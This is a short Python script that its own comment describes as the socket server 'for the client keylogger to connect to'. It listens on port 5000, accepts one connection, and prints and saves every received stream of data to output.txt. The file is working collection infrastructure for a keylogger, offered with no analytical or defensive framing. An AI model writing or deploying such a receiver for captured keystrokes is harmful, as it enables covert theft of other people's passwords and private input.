# Socket server for the client keylogger to connect to. Output will be saved to a file upon connection close
import socket

def server_program():
    # Get hostname
    host = socket.gethostname()
    port = 5000

    server_socket = socket.socket() # Get Instance
    server_socket.bind((host, port)) # Bind host and port together

    # Configure how many clients the server can listen to
    server_socket.listen(1)
    conn, addr = server_socket.accept() # Accept the new connection
    print('Connection from: ' + str(addr))

    # Create output file
    file = open('output.txt', 'w')

    while True:
        # Receive data stream. Wont accept packet larger than 1024
        data = conn.recv(1024).decode()
        if not data:
            break # If data is not received break
        print(str(data))
        file.write(str(data))
    conn.close() # Close the connection
    print('Connection closed!')
    file.close()

if __name__ == '__main__':
    server_program()